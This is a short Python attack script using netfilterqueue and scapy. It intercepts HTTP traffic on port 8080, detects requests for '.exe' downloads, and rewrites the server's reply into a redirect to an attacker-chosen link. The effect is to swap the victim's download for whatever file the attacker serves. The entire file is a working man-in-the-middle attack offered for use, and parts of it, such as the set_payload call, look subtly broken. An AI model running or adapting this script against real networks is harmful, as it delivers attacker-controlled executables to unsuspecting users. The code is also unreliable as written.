#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        payload = scapy_packet[scapy.Raw].load  
        if scapy_packet[scapy.TCP].dport == 8080:
            if b".exe" in payload: 
                print("[*] EXE download:")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[*] Replacing download:")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: whatver/link/you/want\n\n")

                packet.set_payload(bytes(modified_packet), 'utf-8') 

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
